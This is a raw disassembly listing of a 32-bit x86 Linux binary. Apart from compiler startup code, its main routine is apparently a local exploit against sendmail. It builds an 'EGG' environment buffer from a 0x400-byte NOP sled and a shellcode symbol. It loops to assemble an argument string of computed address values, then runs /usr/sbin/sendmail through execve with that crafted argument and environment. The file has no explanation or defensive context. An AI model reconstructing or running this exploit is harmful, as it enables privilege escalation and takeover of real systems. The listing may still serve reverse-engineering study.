xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push loc.gcc2_compiled._3
push sym._init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
push ebx
push eax
call 0x80484ae
pop ebx
add ebx, 0x14ae
mov eax, dword [ebx + 0x38]
test eax, eax
je 0x80484c1
call eax
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov edx, dword [obj.completed.1]
test edx, edx
jne 0x8048529
mov edx, dword [obj.p.0]
mov eax, dword [edx]
test eax, eax
je 0x8048506
lea esi, [esi]
lea eax, [edx + 4]
mov dword [obj.p.0], eax
call dword [edx]
mov edx, dword [obj.p.0]
mov ecx, dword [edx]
test ecx, ecx
jne 0x80484f0
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x804851f
sub esp, 0xc
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
add esp, 0x10
mov eax, 1
mov dword [obj.completed.1], eax
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov eax, sym.imp.__register_frame_info
mov ebp, esp
sub esp, 8
test eax, eax
je 0x8048564
sub esp, 8
push obj.object.2
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
add esp, 0x10
mov esp, ebp
pop ebp
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov eax, dword [obj.__CTOR_LIST__]
mov ebx, obj.__CTOR_LIST__
cmp eax, 0xffffffff
je 0x80487ac
lea esi, [esi]
lea edi, [edi]
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x80487a0
pop eax
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
call loc.gcc2_compiled.
nop
call sym.frame_dummy
call loc.gcc2_compiled._2
leave
ret
push ebp
mov ebp, esp
mov eax, esp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x248
mov dword [var_234h], 0x809f544
mov dword [var_238h], 0x80baf20
sub esp, 0xc
push obj.shellcode
call sym.imp.strlen
add esp, 4
mov eax, eax
add eax, 0x405
push eax
call sym.imp.malloc
add esp, 0x10
mov eax, eax
mov dword [s], eax
cmp dword [s], 0
jne 0x80485ec
sub esp, 0xc
push str.malloc__
call sym.imp.perror
add esp, 0x10
sub esp, 0xc
push 0xffffffffffffffff
call sym.imp.exit
mov esi, esi
sub esp, 8
push str.EGG
push dword [s]
call sym.imp.sprintf
add esp, 0x10
sub esp, 4
push 0x400
push 0x90
mov eax, dword [s]
add eax, 4
push eax
call sym.imp.memset
add esp, 0x10
sub esp, 4
push obj.shellcode
push 0x80487f6
mov eax, dword [s]
add eax, 0x404
push eax
call sym.imp.sprintf
add esp, 0x10
call loc.gcc2_compiled._4
mov eax, eax
add eax, 0x3e8
mov dword [var_23ch], eax
sub esp, 8
push 0x80487f9
lea eax, [s1]
push eax
call sym.imp.sprintf
add esp, 0x10
mov edx, dword [var_238h]
mov eax, dword [var_234h]
sub eax, edx
mov dword [var_240h], eax
mov eax, dword [var_240h]
mov dword [var_244h], eax
mov esi, esi
cmp dword [var_23ch], 0
jne 0x8048690
jmp 0x8048700
nop
movzx eax, byte [var_23ch]
mov dword [var_248h], eax
sub esp, 0xc
push dword [var_248h]
push dword [var_244h]
push dword [var_240h]
push str._u__u._u_
lea eax, [s2]
push eax
call sym.imp.sprintf
add esp, 0x20
sub esp, 8
lea eax, [s2]
push eax
lea eax, [s1]
push eax
call sym.imp.strcat
add esp, 0x10
lea eax, [var_240h]
inc dword [eax]
mov eax, dword [var_240h]
mov dword [var_244h], eax
lea eax, [var_23ch]
shr dword [eax], 8
jmp 0x8048684
mov esi, esi
sub esp, 0xc
lea eax, [s1]
push eax
call sym.imp.strlen
add esp, 0x10
mov eax, eax
lea edx, [eax - 1]
lea eax, [s1]
mov eax, eax
mov byte [edx + eax], 0
mov dword [var_228h], str._usr_sbin_sendmail
lea eax, [s1]
mov dword [var_224h], eax
mov dword [var_220h], 0
mov eax, dword [s]
mov dword [var_230h], eax
mov dword [var_22ch], 0
sub esp, 4
lea eax, [var_230h]
push eax
lea eax, [var_228h]
push eax
push dword [var_228h]
call sym.imp.execve
add esp, 0x10
leave
ret
jmp dword [reloc.strlen]
jmp dword [reloc.malloc]
jmp dword [reloc.perror]
jmp dword [reloc.exit]
jmp dword [reloc.sprintf]
jmp dword [reloc.memset]
jmp dword [reloc.strcat]
jmp dword [reloc.execve]
push ebp
mov ebp, esp
push ebx
push edx
call 0x80487ca
pop ebx
add ebx, 0x1192
lea esi, [esi]
call loc.gcc2_compiled._1
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.__deregister_frame_info]
